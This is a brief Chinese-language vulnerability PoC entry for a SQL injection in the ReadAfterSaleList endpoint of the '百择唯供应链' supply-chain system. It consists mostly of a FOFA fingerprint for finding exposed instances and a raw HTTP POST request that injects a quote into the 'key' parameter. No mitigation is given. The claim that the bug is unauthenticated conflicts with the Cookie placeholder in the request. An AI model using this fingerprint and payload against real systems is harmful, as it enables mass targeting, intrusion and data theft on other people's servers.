# 百择唯供应链存在ReadAfterSaleList存在SQL注入漏洞

百择唯供应链存在ReadAfterSaleList SQL注入漏洞，未经身份验证的攻击者通过漏洞，执行任意代码从而获取到服务器权限。

## fofa

```javascript
body="/Content/Css/_SiteCss/"
```

## poc

```javascript
POST /AfterSale/ReadAfterSaleList HTTP/1.1
Host: 
Content-Length: 106
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 你的Cookie
Connection: keep-alive

time=%E8%BF%91%E4%B8%80%E5%91%A8%E8%AE%A2%E5%8D%95&state=%E5%B7%B2%E7%AD%BE%E6%94%B6&key='&index=1&rows=10
```

